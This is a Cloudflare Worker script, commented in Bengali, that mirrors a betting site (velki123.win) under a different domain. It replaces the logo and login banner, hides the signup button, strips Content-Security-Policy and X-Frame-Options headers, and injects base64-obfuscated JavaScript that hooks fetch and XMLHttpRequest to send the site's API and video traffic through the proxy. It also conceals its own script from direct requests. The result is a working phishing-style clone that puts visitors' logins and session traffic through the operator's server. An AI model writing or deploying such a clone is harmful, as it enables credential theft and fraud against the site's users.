export default {
async fetch(request, env, ctx) {
const TARGET_DOMAIN = env.TARGET_URL || "https://velki123.win";
const API_DOMAINS = ["vrnlapi.com"];
const MEDIA_AND_SCORE_DOMAINS = ["aax-eu1314.com"];
const ALL_TARGETS = [...API_DOMAINS, ...MEDIA_AND_SCORE_DOMAINS];

const url = new URL(request.url);
const originHeader = request.headers.get("Origin") || `https://${url.host}`;

// =========================================================================
// ⚙️ অটোমেটিক প্যাকার ইঞ্জিন: আপনি যত কোডই দিন, এটা অটোমেটিকভাবে এনক্রিপ্ট করবে
// =========================================================================
const autoPackJS = (rawCode) => {
    const obfuscated = btoa(unescape(encodeURIComponent(rawCode)));
    return `!function(){var e="${obfuscated}",t=decodeURIComponent(escape(atob(e)));new Function(t)()}();`;
};

// ==========================================
// 🛡️ প্রফেশনাল সিকিউরিটি: Ghost Script Route
// ==========================================
if (url.pathname === '/__secure_core.js') {
    const referer = request.headers.get("Referer");
    
    if (!referer || !referer.includes(url.hostname)) {
        return new Response(`console.log("Access Denied: Nice try, but you can't copy this code! 😎");`, {
            status: 200,
            headers: { "Content-Type": "application/javascript" }
        });
    }

    const rawJs = `
      (function() {
        const proxyPrefix = '/__api_proxy/';
        const targetApis = ${JSON.stringify(ALL_TARGETS)};
        function shouldIntercept(url) {
          if (typeof url !== 'string') return false;
          if (url.includes('__api_proxy')) return false; 
          return targetApis.some(api => url.includes(api));
        }
        const originalFetch = window.fetch;
        window.fetch = async function(...args) {
          try {
            let reqUrl = args[0];
            if (typeof reqUrl === 'string' && shouldIntercept(reqUrl)) {
              args[0] = proxyPrefix + reqUrl;
            } else if (reqUrl instanceof Request && shouldIntercept(reqUrl.url)) {
              args[0] = new Request(proxyPrefix + reqUrl.url, reqUrl);
            }
          } catch(e) {}
          return originalFetch.apply(this, args);
        };
        const originalOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url, ...rest) {
          try {
            if (typeof url === 'string' && shouldIntercept(url)) {
              url = proxyPrefix + url;
            }
          } catch(e) {}
          return originalOpen.call(this, method, url, ...rest);
        };
      })();
    `;
    
    const secretCode = autoPackJS(rawJs);

    return new Response(secretCode, {
        status: 200,
        headers: { 
            "Content-Type": "application/javascript",
            "Cache-Control": "no-cache, no-store, must-revalidate"
        }
    });
}

// ১. CORS প্রিফ্লাইট
if (request.method === "OPTIONS") {
  return new Response(null, {
    headers: {
      "Access-Control-Allow-Origin": originHeader,
      "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS, PATCH",
      "Access-Control-Allow-Headers": request.headers.get("Access-Control-Request-Headers") || "*",
      "Access-Control-Allow-Credentials": "true",
      "Access-Control-Max-Age": "86400",
    }
  });
}

// ২. API এবং Video Stream প্রক্সি
if (url.pathname.startsWith('/__api_proxy/')) {
  let actualApiUrl = request.url.substring(request.url.indexOf('/__api_proxy/') + 13);
  if (!actualApiUrl.startsWith('http')) {
     actualApiUrl = 'https://' + actualApiUrl;
  }
  try {
    const targetApi = new URL(actualApiUrl);
    const apiReq = new Request(targetApi.toString(), request);
    apiReq.headers.set("Host", targetApi.host);
    apiReq.headers.set("Origin", TARGET_DOMAIN);
    apiReq.headers.set("Referer", TARGET_DOMAIN + "/");

    const apiRes = await fetch(apiReq);
    let newApiRes;
    const contentType = apiRes.headers.get("content-type") || "";
    
    if (contentType.includes("mpegurl") || contentType.includes("m3u8") || url.pathname.endsWith(".m3u8")) {
        let m3u8Text = await apiRes.text();
        const proxyPrefix = `https://${url.host}/__api_proxy/`;
        ALL_TARGETS.forEach(api => {
            m3u8Text = m3u8Text.replaceAll(`https://${api}`, `${proxyPrefix}https://${api}`);
        });
        const modHeaders = new Headers(apiRes.headers);
        modHeaders.delete("content-length"); 
        newApiRes = new Response(m3u8Text, { status: apiRes.status, statusText: apiRes.statusText, headers: modHeaders });
    } else {
        newApiRes = new Response(apiRes.body, apiRes);
    }
    
    const finalHeaders = new Headers(newApiRes.headers);
    finalHeaders.set("Access-Control-Allow-Origin", originHeader);
    finalHeaders.set("Access-Control-Allow-Credentials", "true");
    return new Response(newApiRes.body, { status: newApiRes.status, statusText: newApiRes.statusText, headers: finalHeaders });
  } catch (e) {
    return new Response(JSON.stringify({ error: "Proxy Error" }), { status: 500 });
  }
}

// ৩. মেইন ওয়েবসাইট লোড করা
const target = new URL(TARGET_DOMAIN);
target.pathname = url.pathname;
target.search = url.search;
const proxyRequest = new Request(target.toString(), request);
proxyRequest.headers.set("Host", target.hostname);
proxyRequest.headers.set("Origin", target.origin);
proxyRequest.headers.set("Referer", target.origin);
proxyRequest.headers.delete("Accept-Encoding"); 

try {
  const response = await fetch(proxyRequest);
  const contentType = response.headers.get("content-type") || "";
  let responseBody;
  const newResponseHeaders = new Headers(response.headers);

  if (contentType.includes("text/html") || contentType.includes("application/javascript") || contentType.includes("text/javascript")) {
    let text = await response.text();
    const proxyPrefix = `https://${url.host}/__api_proxy/`;
    
    MEDIA_AND_SCORE_DOMAINS.forEach(api => {
        const originalUrl = `https://${api}`;
        const proxyUrl = `${proxyPrefix}${originalUrl}`;
        text = text.replaceAll(originalUrl, proxyUrl);
        text = text.replaceAll(originalUrl.replace(/\//g, '\\/'), proxyUrl.replace(/\//g, '\\/'));
    });

    // ডোমেইন নেম রিপ্লেসমেন্ট
    text = text.replaceAll(/velki123\.win/gi, "velkix.live");
    text = text.replaceAll(/velki123/gi, "velkix.live");

    const newLogoUrl = "https://i.postimg.cc/J0P019Hr/20260408-225146.webp";
    const newLoginBanner = "https://i.postimg.cc/CLCXKkN6/20260408-232743.webp";

    text = text.replace(/([a-zA-Z0-9_./-]*velki-logo[a-zA-Z0-9_.-]*\.(png|webp|jpg|jpeg|svg))/gi, newLogoUrl);
    text = text.replace(/([a-zA-Z0-9_./-]*velki-login-signup-banner[a-zA-Z0-9_.-]*\.(png|webp|jpg|jpeg|svg))/gi, newLoginBanner);
    text = text.replaceAll('class="signup" href="/"', 'class="signup" style="display:none !important;"');

    // 🔹 আল্ট্রা সিকিউরিটি আপডেট: CSS এবং সিকিউর স্ক্রিপ্ট ইনজেকশন 🔹
    if (contentType.includes("text/html")) {
        
        const rawForceJs = `
            var p1 = document.createElement('link'); p1.rel = 'preload'; p1.as = 'image'; p1.href = '${newLogoUrl}';
            var p2 = document.createElement('link'); p2.rel = 'preload'; p2.as = 'image'; p2.href = '${newLoginBanner}';
            document.head.appendChild(p1); document.head.appendChild(p2);

            // ১. ডাইনামিক CSS ইনজেকশন (এখান থেকে স্ক্রল অফের কোড মুছে দেওয়া হয়েছে যাতে নিচে না কাটে)
            var s = document.createElement('style');
            s.innerHTML = '.logo-sec img { content: url("${newLogoUrl}") !important; width: 115px !important; height: auto !important; max-width: none !important; } ' +
                          '.is-outsite-icon-new { background-color: rgba(255, 255, 255, 0.85) !important; border-radius: 5px !important; overflow: hidden !important; } ' +
                          '.is-outsite-icon-new img { content: url("${newLogoUrl}") !important; width: 100% !important; height: auto !important; object-fit: contain !important; } ' +
                          '.is-outsite-icon-new::after { content: ""; position: absolute; top: 0; left: -150%; width: 50%; height: 100%; background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.6) 50%, rgba(255,255,255,0) 100%); transform: skewX(-25deg); animation: premiumShine 6s infinite ease-in-out; pointer-events: none; } ' +
                          '@keyframes premiumShine { 0% { left: -150%; } 30% { left: 150%; } 100% { left: 150%; } } ' +
                          '.signup { display: none !important; visibility: hidden !important; opacity: 0 !important; width: 0 !important; height: 0 !important; pointer-events: none !important; }';
            document.head.appendChild(s);

            var sc = document.createElement('script');
            sc.src = '/__secure_core.js';
            document.head.appendChild(sc);

            // ২. ডাইনামিক স্টিকি হেডার এবং সাইনআপ রিমুভাল
            setInterval(function() {
                // ক) সাইন আপ বাটন হাইড (সব পেজ থেকে)
                document.querySelectorAll('.signup').forEach(function(btn) {
                    btn.remove();
                });

                // খ) শুধুমাত্র হোমপেজে স্টিকি সেকশন অ্যাপ্লাই
                var path = window.location.pathname;
                var isHomePage = (path === '/' || path === '/m' || path === '/m/');
                
                var header = document.querySelector('#header') || document.querySelector('.header');
                var banner = document.querySelector('.home-banner-sec');
                var marquee = document.querySelector('.marquee-notification');
                var gamesSlot = document.querySelector('.games-slot');

                if (isHomePage) {
                    var currentTop = 0;
                    
                    // একে একে স্টিকি এবং টপ পজিশন সেট করা হচ্ছে
                    if (header) {
                        header.style.position = 'sticky';
                        header.style.top = currentTop + 'px';
                        header.style.zIndex = '9999';
                        currentTop += header.offsetHeight; // এরপরেরটা এর নিচ থেকে শুরু হবে
                    }
                    if (banner) {
                        banner.style.position = 'sticky';
                        banner.style.top = currentTop + 'px';
                        banner.style.zIndex = '9998';
                        currentTop += banner.offsetHeight;
                    }
                    if (marquee) {
                        marquee.style.position = 'sticky';
                        marquee.style.top = currentTop + 'px';
                        marquee.style.zIndex = '9997';
                        currentTop += marquee.offsetHeight;
                    }
                    if (gamesSlot) {
                        gamesSlot.style.position = 'sticky';
                        gamesSlot.style.top = currentTop + 'px';
                        gamesSlot.style.zIndex = '9996';
                    }
                } else {
                    // গ) অন্য পেজে গেলে সব নরমাল ডিফল্ট হয়ে যাবে, যাতে অন্য পেজে স্ক্রল বা অন্য কোনো সমস্যা না হয়
                    [header, banner, marquee, gamesSlot].forEach(function(el) {
                        if (el) {
                            el.style.position = '';
                            el.style.top = '';
                            el.style.zIndex = '';
                        }
                    });
                }
            }, 150);
        `;

        const encryptedJsTag = `<script>${autoPackJS(rawForceJs)}</script>`;
        
        if (text.includes('<head>')) {
          text = text.replace('<head>', '<head>' + encryptedJsTag);
        } else {
          text = encryptedJsTag + text;
        }
    }
    
    responseBody = text;
    newResponseHeaders.delete("content-length"); 
    newResponseHeaders.set("Cache-Control", "no-cache, no-store, must-revalidate");
  } else {
    responseBody = response.body;
  }

  newResponseHeaders.delete("Content-Security-Policy");
  newResponseHeaders.delete("X-Frame-Options");
  newResponseHeaders.set("Access-Control-Allow-Origin", originHeader);
  
  return new Response(responseBody, {
    status: response.status,
    statusText: response.statusText,
    headers: newResponseHeaders
  });
} catch (error) {
  return new Response("System Error", { status: 500 });
}

}
};